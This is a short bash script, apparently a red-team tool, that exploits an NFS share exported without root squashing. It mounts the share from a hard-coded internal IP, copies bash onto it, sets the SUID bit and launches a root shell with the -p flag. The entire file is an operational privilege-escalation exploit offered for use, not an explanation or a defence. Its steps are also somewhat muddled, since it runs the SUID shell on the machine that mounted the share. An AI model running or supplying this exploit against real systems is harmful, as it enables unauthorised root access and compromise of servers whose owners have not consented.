#!/bin/bash

# Red Team - NFS Exploitation Script
# Mount misconfigured NFS share and escalate privileges

NFS_SERVER="192.168.1.100"
NFS_SHARE="/export"
MOUNT_POINT="/mnt/nfs_exploit"

echo "[+] Mounting misconfigured NFS share from $NFS_SERVER..."

# Mount the NFS share with no root squashing
mkdir -p $MOUNT_POINT
mount -t nfs $NFS_SERVER:$NFS_SHARE $MOUNT_POINT

# Escalate privileges by creating a SUID shell on the NFS share
echo "[+] Creating SUID root shell..."
cp /bin/bash $MOUNT_POINT/bash_suid
chmod +s $MOUNT_POINT/bash_suid

# Execute the SUID shell
echo "[+] SUID shell created. Running root shell from NFS..."
$MOUNT_POINT/bash_suid -p

echo "[+] NFS exploitation complete. Root access gained."